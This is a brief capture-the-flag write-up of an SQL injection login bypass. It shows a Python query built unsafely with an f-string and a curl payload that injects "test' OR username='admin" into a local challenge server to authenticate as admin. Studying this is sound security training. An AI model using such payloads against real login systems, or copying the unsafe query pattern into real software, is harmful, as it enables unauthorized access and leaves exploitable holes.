# SQL Injection 2

In this challenge, we are given a login service. This time, both the username and password field to pass into the query
(still unsafely) are enclosed in 's. 

```python
query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{ password }'"
```

In the previous example, at the end of the prompt, we didn't have a `'` to worry about. This is very similar to the
command-injection-3, where the argument to be injected was also enclosed in `'`s. The solution there was to ensure that
after adding the command we wanted to run, we ensure that we close `'` on our own. We take a similar approach here.

```sql
SELECT rowid, * FROM users WHERE username = 'admin' AND password = 'test' OR username='admin'
                                             ^^^^^                  ^^^^^^^^^^^^^^^^^^^^^^
                                             What we control
```

Notice that `password = test' OR username='admin`, we deliberately do not include the ending `'`, since the query already includes that.
Therefore, this is what the payload will look like:

```bash
curl 'challenge.localhost:80/auth' -d "login-name=admin" -d "pword=test' OR username='admin" -L -b cookie.txt
```

And there you go! We authenticated ourselves and got the flag in the html response!